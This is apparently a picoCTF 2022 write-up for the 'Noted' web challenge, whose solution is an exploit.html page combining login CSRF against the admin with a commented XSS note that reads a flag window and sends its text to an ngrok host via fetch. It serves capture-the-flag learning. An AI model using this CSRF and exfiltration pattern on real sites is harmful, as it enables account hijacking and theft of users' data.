---
name: Noted (2022)
event: Pico CTF 2022
category: Web
description: Writeup for Noted (Web) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Noted

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/OUizLCfp9Dw/0.jpg)](https://youtu.be/OUizLCfp9Dw?t=669 "Pico CTF 2022: Noted")

## Description

> Web Challenge I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?

## Solution

#### exploit.html

{% code overflow="wrap" %}
```html
<body>
    <p>flag plz</p>
    <form action="http://0.0.0.0:8080/login" method="POST" id="loginForm">
        <input type="text" name="username" value="admin" />
        <input type="password" name="password" value="admin" />
        <input type="submit" value="Submit" />
    </form>
    <script>
        // Open notes in new window (containing the flag)
        window.open("http://0.0.0.0:8080/notes", "flagWindow");
        // Force admin to login to our account
        loginForm.submit();
        // When the admin arrives to our account, our XSS note will steal the flag:
        /* <script>let flagWindow = window.open('', 'flagWindow'); let flag = flagWindow.document.documentElement.innerText; fetch('http://3297-81-103-153-174.ngrok.io?flag=' + flag);<//script> */
    </script>
</body>
```
{% endcode %}
